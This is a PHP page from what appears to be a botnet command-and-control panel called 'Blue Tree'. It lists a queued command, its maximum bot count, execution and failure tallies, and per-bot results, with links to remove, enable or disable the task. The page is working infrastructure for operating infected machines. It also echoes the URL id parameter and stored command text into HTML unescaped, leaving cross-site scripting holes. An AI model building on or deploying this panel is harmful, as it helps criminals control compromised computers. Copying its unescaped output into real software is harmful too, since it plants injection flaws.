<?php
include_once("config.php");
$id = "";
$task_type = "";
if(!empty($_GET["id"])){
	$id = $_GET["id"];
	$check = "SELECT * FROM `tasks` WHERE `id` = :id";
	if($sth = $db->prepare($check)){
		$sth->bindParam(":id", $id);
		$sth->execute();
		if(!($sth->rowCount() > 0)){
			die("error.");
		}
		else{
			while($row = $sth->fetch(PDO::FETCH_ASSOC)){
				$task_type = $task_array[$row["cmd_num"]];	
			}
		}
		
	}
}	
else{
	die("error.");
	
}
if(!empty($_GET["status"])){
		$g_Status = $_GET["status"];
		if($g_Status == "Disable"){
			$update = "UPDATE `tasks` SET `status` = '0' WHERE `id` = :id";
			if($sth = $db->prepare($update)){
				$sth->bindParam(":id", $id);
				$sth->execute();
			}
		}
		else if($g_Status == "Enable"){
			$update = "UPDATE `tasks` SET `status` = '1' WHERE `id` = :id";
			if($sth = $db->prepare($update)){
				$sth->bindParam(":id", $id);
				$sth->execute();
			}
		}
	}
else if(isset($_GET["remove"])){
		$remove = $_GET["remove"];
		$remove_query = "DELETE FROM `tasks` WHERE `id` = :id";
		if($sth = $db->prepare($remove_query)){
			$sth->bindParam(":id", $remove);
			$sth->execute();
			header("Location: tasks.php");	
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Blue Tree - Manage Tasks</title>
	<link rel="stylesheet" href="assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<link rel="stylesheet" href="css/bootstrap-extend.css">
	<link rel="stylesheet" href="css/master_style.css">
	<link rel="stylesheet" href="css/skins/_all-skins.css">
    <link href="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <a href="index.php" class="logo">
      
	  <b class="logo-lg">
		  <span ><p>Blue Tree </p></span>
	  </b>
    </a>
  </header>
  
  <?php

include_once("sidebar.php");
?>

  <div class="content-wrapper">
    <section class="content-header">
      <h1>
        Blue Tree
        <small>Manage Task #<?php echo $id; ?></small>
      </h1>
    </section>

    <section class="content">
	 


	  
	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Task Type: <?php echo $task_type; ?></h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>Command Data</th>
							<th>Remove</th>
							<th>Enable/Disable</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$cmd_data = "";
					$max_bots = "";
					$tasks = "SELECT * FROM `tasks` WHERE `id` = :id";
					if($sth = $db->prepare($tasks)){
						
						$sth->bindParam(":id", $id);
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							$cmd_data = $row["cmd"];
							$max_bots = $row["maxbots"];
							echo "<tr><td>".$row["cmd"]."</td>";
							echo "<td><a href='taskinfo.php?remove=".$row["id"]."' type='submit' class='btn btn-success'>Remove</a></td>";
							echo "<td><a href='taskinfo.php?status=".$task_options_array[$row["status"]]."&id=".$id."' type='submit' class='btn btn-success'>".$task_options_array[$row["status"]]."</a></td>";
							echo "</tr>";
						}
					}
					
					?>
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
	  

	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Task Info</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>Status</th>
							<th>Executions </th>
							<th>Failed</th>
							<th>Time Added</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$tasks = "SELECT * FROM `tasks` WHERE `id` = :id";
					if($sth = $db->prepare($tasks)){
						$sth->bindParam(":id", $id);
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							echo "<tr><td>".$task_status_array[$row["status"]]."</td><td>".$row["executed"]."</td><td>".$row["failed"]."</td><td>".$row["time_added"]."</td></tr>";
						}
					}
					?>
					
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
	  
	  <div class="row">
		<div class="col-12">
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Bot Info</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>Bot ID</th>
							<th>Command Result</th>
							<th>Time Added</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$tasks = "SELECT * FROM `complete_tasks` WHERE `id` = :id";
					if($sth = $db->prepare($tasks)){
						$sth->bindParam(":id", $id);
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							echo "<tr><td>".$row["botid"]."</td><td>".$status_array[$row["result"]]."</td><td>".$row["time_executed"]."</td></tr>";
						}
					}
					
					?>
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
    </section>
  </div>
  <footer class="main-footer">
	<center><b><u>Blue Tree</u></b></center>
  </footer>
  <div class="control-sidebar-bg"></div>
  
</div>

	<script src="assets/vendor_components/jquery/dist/jquery.js"></script>
	<script src="assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	<script src="assets/vendor_components/popper/dist/popper.min.js"></script>
	<script src="assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	<script src="assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<script src="assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<script src="assets/vendor_components/jquery.peity/jquery.peity.js"></script>
	<script src="assets/vendor_components/raphael/raphael.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-us-aea-en.js"></script>
	<script src="js/template.js"></script>

</body>
</html>
